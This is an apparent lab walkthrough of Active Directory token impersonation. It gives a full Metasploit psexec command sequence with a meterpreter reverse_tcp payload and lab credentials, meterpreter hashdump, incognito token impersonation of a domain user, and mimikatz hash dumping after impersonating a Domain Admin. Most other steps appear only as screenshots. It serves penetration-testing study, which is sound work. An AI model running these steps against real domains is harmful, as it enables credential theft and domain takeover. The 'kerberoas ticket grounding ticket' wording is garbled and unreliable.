## Introduction
![[AD_post11.png]]

## Describing token impersonation in a practical way:
1. Pop a shell and load incognito:
![[AD_post12.png]]

2. Impersonating our domain user:
![[AD_post13.png]]

3. Attempt to dump hashes as non-Domain Admin:
![[AD_post14.png]]
**Result** - We get **access denied** error.

**Alright, but what if a Domain Admin token was available?**

4. Identify the domain Administrator:
![[AD_post15.png]]

5. Impersonate our Domain Administrator:
![[AD_post16.png]]

6. Again trying to dump hashes with mimikatz:
![[AD_post17.png]]

7. We also get the kerberoas ticket grounding ticket hash:
![[AD_post18.png]]

## Token Impersonation in a lab:
1. Getting a meterpreter shell using msfconsole:
```python
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole 
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > options
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.16
RHOSTS => 192.168.1.16
msf6 exploit(windows/smb/psexec) > set SMBDOMAIN marvel.local
SMBDOMAIN => marvel.local
msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
SMBPASS => Password1
msf6 exploit(windows/smb/psexec) > set SMBUSER fcastle
SMBUSER => fcastle
msf6 exploit(windows/smb/psexec) > show targets
msf6 exploit(windows/smb/psexec) > set TARGET 2
TARGET => 2
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > run
```

2. Doing some meterpreter stuffs:
```python
meterpreter > hashdump
meterpreter > getuid
meterpreter > sysinfo
```

3. Loading incognito extension for token impersonation:
```python
meterpreter > load incognito
meterpreter > help
```

4. Listing available tokens on system:
![[AD_post19.png]]

5. Impersonate fcastle token
```python
meterpreter > impersonate_token marvel\\fcastle
[+] Delegation token available
[+] Successfully impersonated user MARVEL\fcastle
```

6. Getting a shell as fcastle
![[AD_post20.png]]
